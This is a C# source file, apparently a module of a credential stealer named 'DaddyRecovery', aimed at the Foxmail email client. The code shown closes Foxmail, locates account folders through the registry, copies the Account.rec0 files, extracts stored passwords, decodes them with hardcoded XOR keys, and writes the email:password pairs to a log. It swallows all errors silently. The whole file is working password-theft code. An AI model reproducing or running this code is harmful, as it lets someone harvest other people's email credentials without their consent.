namespace DaddyRecovery.Applications
{
    using System;
    using System.IO;
    using System.Text;
    using System.Threading;
    using DaddyRecovery.Helpers;

    public static class MailFoxPassword
    {
        private static void Reader(string FilePath, string MailText, bool accfound = false)
        {
            try
            {
                Thread.Sleep(1000);
                using (var fs = new FileStream(FilePath, FileMode.Open))
                {
                    int ver = 0, len = (int)fs.Length;
                    byte[] bits = new byte[len];

                    string buffer = string.Empty, acc = string.Empty, pw = string.Empty;

                    int read = fs.Read(bits, 0, len);
                    ver = bits[0] != 0xD0 ? 1 : 0;
                    for (int jx = 0; jx < len; ++jx)
                    {
                        if (bits[jx] <= 0x20 || bits[jx] >= 0x7f || bits[jx] == 0x3d)
                        {
                            buffer = "";
                        }
                        else
                        {
                            buffer += (char)bits[jx];

                            if (!buffer.Equals("Account") && !buffer.Equals("POP3Account"))
                            {
                                if (accfound && (buffer.Equals("Password") || buffer.Equals("POP3Password")))
                                {
                                    int index = jx + 9;
                                    if (ver == 0) index = jx + 2;
                                    while (bits[index] > 0x20 && bits[index] < 0x7f)
                                    {
                                        pw += (char)bits[index];
                                        index++;
                                    }
                                    CombineEx.CreateFile(true, GlobalPath.FoxMailLog, $"{MailText} : {DecodeFox(ver, pw)}{Environment.NewLine}");
                                    jx = index;
                                    break;
                                }
                            }
                            else
                            {
                                int index = jx + 9;
                                if (ver == 0) index = jx + 2;

                                while (bits[index] > 0x20 && bits[index] < 0x7f)
                                {
                                    acc += (char)bits[index];
                                    index++;
                                }

                                accfound = true;
                                jx = index;
                            }
                        }
                    }
                }
            }
            catch { }
        }

        private static string DecodeFox(int v, string pHash)
        {
            string decodedPW = string.Empty;
            int[] a = { '~', 'd', 'r', 'a', 'G', 'o', 'n', '~' }, v7a = { '~', 'F', '@', '7', '%', 'm', '$', '~' };
            int index = 0, size = pHash.Length / 2, fc0 = Convert.ToInt32("5A", 16);

            if (v == 1)
            {
                a = v7a;
                fc0 = Convert.ToInt32("71", 16);
            }
            int[] b = new int[size];

            for (int i = 0; i < size; i++)
            {
                b[i] = Convert.ToInt32(pHash.Substring(index, 2), 16);
                index += 2;
            }

            int[] c = new int[b.Length];
            c[0] = b[0] ^ fc0;
            Array.Copy(b, 1, c, 1, b.Length - 1);

            while (b.Length > a.Length)
            {
                int[] newA = new int[a.Length * 2];
                Array.Copy(a, 0, newA, 0, a.Length);
                Array.Copy(a, 0, newA, a.Length, a.Length);
                a = newA;
            }

            int[] d = new int[b.Length];
            for (int i = 1; i < b.Length; i++)
            {
                d[i - 1] = b[i] ^ a[i - 1];
            }

            int[] e = new int[d.Length];
            for (int i = 0; i < d.Length - 1; i++)
            {
                e[i] = d[i] - c[i] >= 0 ? d[i] - c[i] : d[i] + 255 - c[i];
                decodedPW += (char)e[i];
            }

            return decodedPW;
        }

        public static void Inizialize()
        {
            ProcessControl.Closing("Foxmail");
            const string FOXPATH = @"SOFTWARE\Classes\Foxmail.url.mailto\Shell\open\command";
            string UserDat = string.Empty, FinalPath = string.Empty, Email = string.Empty;
            if (CombineEx.ExistsDir(FoxMailPath.GetFoxMail(FOXPATH)))
            {
                try
                {
                    foreach (string dir in Directory.EnumerateDirectories(FoxMailPath.GetFoxMail(FOXPATH), "*@*", SearchOption.TopDirectoryOnly))
                    {
                        Email = dir.Substring(dir.LastIndexOf("\\") + 1);
                        UserDat = CombineEx.CombinePath(dir, @"Accounts\Account.rec0");
                        FinalPath = CombineEx.CombinePath(GlobalPath.FoxMailPass, @"Account.rec0");
                        CombineEx.FileCopy(UserDat, FinalPath, false);
                        break;
                    }
                }
                catch { }
                Reader(UserDat, Email); 
                CombineEx.DeleteFile(FinalPath);
            }
        }
    }
}